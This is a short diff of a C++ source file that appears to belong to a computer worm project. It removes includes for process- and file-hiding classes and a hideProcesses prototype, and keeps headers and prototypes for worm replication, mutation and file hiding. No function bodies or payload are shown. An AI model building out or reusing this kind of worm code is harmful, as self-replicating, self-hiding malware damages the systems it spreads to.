@@ -2,9 +2,7 @@
 #include <chrono>
 #include <thread>
 #include <cstdlib> // For system function
-#include "ProcessHider.h" // Include the header for ProcessHider class
-#include "ProcessEnumerator.h" // Include the header for ProcessEnumerator class
-#include "FileHider.h" // Include the header for FileHider class
+
 #include "eventDrivenWorm.h" // Include the header for WormReplicator class
 #include "enigmaticWorm.h" // Include the header for EnigmaticWorm class
 #include "mayhem_worm_mutator.h" // Include the header for MayhemWorm class
@@ -14,7 +12,6 @@
 using namespace std;
 
 // Function prototypes
-void hideProcesses();
 void hideWormFile();
 void replicateWorm();
 void initiateEnigmaticActivities();
